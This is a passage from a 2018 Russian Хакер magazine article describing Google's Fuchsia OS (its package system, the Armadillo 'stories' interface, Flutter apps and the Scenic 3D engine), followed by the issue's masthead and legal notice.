  Все компоненты упакова ны в пакеты, которые могут быть синхронизирова‐
ны или скачаны по требова нию с помощью Ledger. Пакетом в Fuchsia может
быть не только компонент или набор компонентов, но и что угодно вообще.
На манер современных дистрибутивов Linux «Фуксия» вся состоит из пакетов,
начиная от загрузчика и заканчивая конфигура ционным файлом видеодрай‐
вера.
  Модульный дизайн поз волит Google избежать ада, в который она попала
с Android. Теперь производителю не нужно будет обновлять всю ОС целиком,
чтобы исправить баг в мультимедиадекодере или обновить драйвер.


ИСТОРИИ ИЗ БУДУЩЕГО
Armadillo — так называется, а точнее назывался графический интерфейс
Fuchsia до того, как разработчики выпилили его из исходников буквально нес‐
колько дней назад. Armadillo представляет собой нечто вроде того самого
фида Google и панели пос ледних задач (а точнее, панели «историй»), раз‐
деленных  информационной  строкой  (своего  рода  строка  состояния,
вынесенная в середину экрана).
  Две важные вещи, которые нужно знать об Armadillo:
 • рабочий стол контекс тно зависимый;
 • пользователь име ет дело не с приложениями и их окнами, а с историями.

Контекстно зависимую природу Fuchsia мы уже обсуждали. Это тот самый
фид в стиле Google Feed, который формируется за счет работы агентов Max‐
well, анализирующих все и вся на сво ем пути.
  С историями все несколько интерес нее. Дело в том, что в Armadillo нет так
называемого freeform‐режима расположения окон, привычного нам по Win‐
dows, OS X или Linux. Интерфейс заточен на мно жес тво разных устройств
с различными размерами экра на, поэтому и управление окнами здесь орга‐
низовано совершенно дру гим образом, больше напоминающим фреймовые
оконные менеджеры. Ты можешь открыть приложение (а точнее, модуль)
на весь экран, можешь добавить к нему еще один модуль, разделив экран,
либо, наоборот, сло жить модули друг на друга на манер вкладок в браузере.





           История из двух приложений. Фото: 9To5Google

Каждый модуль в Fuchsia снабжен информацией о том, какую функцию он
выпол няет и, как следствие, с какими типами сущностей его можно свя зать.
ОС активно использует эту информа цию, чтобы избавить пользователя
от необходимости иметь дело с приложениями.
  Допустим, друг делит ся с тобой электронной книгой (а точнее, сущностью,
в которой прописано, что это за электронная кни га). Fuchsia автоматически
находит эту книгу в Сети, ска чивает модуль для ее просмотра/покупки
и демонстрирует пользователю. При этом сам модуль может быть мак‐
симально простым, а полноценное приложение может быть докачано по мере
надобности.


ОДИН ЗА ВСЕХ
Fuchsia — операционная система для всех типов устройств одновременно.
Она может работать на смартфонах, планшетах, компьютерах, системах
умного дома и даже на микроконтроллерах (если снять все лишнее и оста‐
вить только ядро LK). Ее интерфейс может растягиваться, сжиматься и про‐
извольно изменять геомет рию. Armadillo в целях отладки позволя ет делать
это прямо на лету.
   Google заяв ляет, что уже в ближайшие три года Fuchsia будет работать
на устройствах типа Google Home, а в течение пяти лет заменит Android.
Это могут быть слишком амбициозные планы, но, если верить журналисту Ars
Technica, который делал обзор Fuchsia год назад, на его Pixel‐буке уже
работала сеть, сенсорный экран, трекпад, кла виату ра, USB‐порты, а сама
операционка хоть и напоминала макет, но уже была работоспособной.
  Совсем недавно также появилась информа ция, что в Fuchsia будет пол‐
ноценная поддержка приложений Android. И запускаться они будут не в эму‐
ляторе, как это происходит в Chrome OS, а в пол ноценной среде исполнения
Android, встроенной в «Фуксию».
  К слову, о приложениях. По умолчанию для написания графических при‐
ложений в Fuchsia используется фреймворк Flutter, который примечателен
тем, что позволяет создавать приложения уже сей час, но используя Android
и iOS в качестве целевых платформ.  Flutter полюбился программистам
за простоту и эффективность, и они уже создают на нем софт, а значит,
к моменту выхода в свет Fuchsia будет иметь комплект из миллионов при‐
ложений для Android и сотен тысяч нативных приложений, написанных
на Flutter.





               Flutter‐приложения можно писать в Android Studio


Scenic
Говоря о Fuchsia, нельзя не упомянуть об еще одной очень инте ресной осо‐
бенности. Fuchsia, как и все с логотипом Google, использует Material Design
в своем интерфейсе. Интересная особенность этого язы ка дизайна в экстен‐
сивном использовании идеи слоев и теней. Интерфейс в стиле Material De‐
sign — это не просто стопки графичес ких элементов с черной обводкой
под ними, а сложная композиция с мно гими уровнями и несколькими
источниками света, которые дают разные тени.
  В Android и в веб‐приложениях вся эта сложная сцена прос то эмулиру ется,
но в Fuchsia она реальна. Движок Scenic, который используется для отрисов‐
ки интерфейса ОС, — это 3D‐движок. Он стро ит настоящую 3D‐сцену, рас‐
полагает эле мен ты интерфейса и источники света под правильными углами,
а затем использует виртуальную камеру, чтобы сделать из все го этого 2D‐
картинку.
  Еще одна причина использования Scenic — ориентация на применение
Fuchsia также в качестве ОС для систем виртуаль ной реальности, которые
требуют создания различных изображений с разных углов для достижения
эффекта глубины.



ВЫВОДЫ
Чем можно подытожить этот рассказ? Fuchsia определенно очень интерес‐
ный и амбициозный про ект с множес твом интересней ших идей и находок.
В ней продуманное и современное ядро, пра виль ные средства изоляции
и взаимодействия приложений, прекрасный графический движок и фрей‐
мворк создания приложений.
  Но это Google во всей своей красе.
  Каждый раз, когда я покупаю новый телефон, я пол ностью отключаю в нем
все голосовые ассистенты и всевозможные средс тва синхронизации, кроме
адресной книги и календаря. У меня есть специаль ный телефон, в котором
вообще нет сервисов Google. Поз волит ли Fuchsia сделать мне то же самое?
Действительно ли она нас только модуль ная, что я смогу выпилить из нее всю
интеллектуальщину и оста вить только то, что мне нужно? Посмотрим — в кон‐
це концов, ждать осталось недолго.


        WWW

                     •Слоеный пирог Fuchsia
                   •Документация Fuchsia
                     •Словарь терминов
                   •Обзор Fuchsia от Ars Technica
                      •Веб‐демо интерфейса Fuchsia
                     •Ранняя версия Armadillo, собранная в приложе‐
                        ние для Android
    №12 (237)
          Андрей Пись мен ный        Илья Русанен          Алексей Глазков
              Главный редактор       Зам. главного редактора     Выпускающий редактор
               pismenny@glc.ru        по техническим вопросам          glazkov@glc.ru
                                            rusanen@glc.ru
                                 Евгения Шарипова
                                     Литературный редактор


                           РЕДАКТОРЫ РУБРИК
          Андрей Пись мен ный        Илья Русанен          Александр «Dr.»
               pismenny@glc.ru             rusanen@glc.ru            Лозовский
                                                                           lozovsky@glc.ru
          Иван «aLLy» Андреев       Евгений Зобнин          Тать яна Чупрова
            iam@russiansecurity.expert          zobnin@glc.ru              chuprova@glc.ru


                          MEGANEWS
                           Мария Нефёдова
                                            nefedova@glc.ru


                                  АРТ
                                      yambuto
                                      yambuto@gmail.com


                               РЕКЛАМА

                                  Анна Яковлева
                               Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                             Вопросы по под писке: lapina@glc.ru
                            Вопросы по материалам: support@glc.ru





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Издатель: ИП
Югай Александр Олегович, 400046, Волгоградская область, г. Волгоград, ул. Дружбы народов, д. 54. Учредитель: ООО «Медиа Кар» 125080,
город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, ком ната 54, офис 7. Зарегистри ровано в Федеральной службе
по надзору в сфере связи, информационных технологий и массовых ком муника ций (Роскомнадзоре), свидетельство Эл № ФС77‐67001 от 30.
08.2016 года. Мнение редакции не обязатель но совпада ет с мнением авторов. Все материалы в номере предоставляются как информация
к размышлению. Лица, использующие данную информацию в противозаконных целях, могут быть привлечены к ответс твен ности. Редакция
не несет ответственности за содер жание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование
редакционных материалов жур нала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2018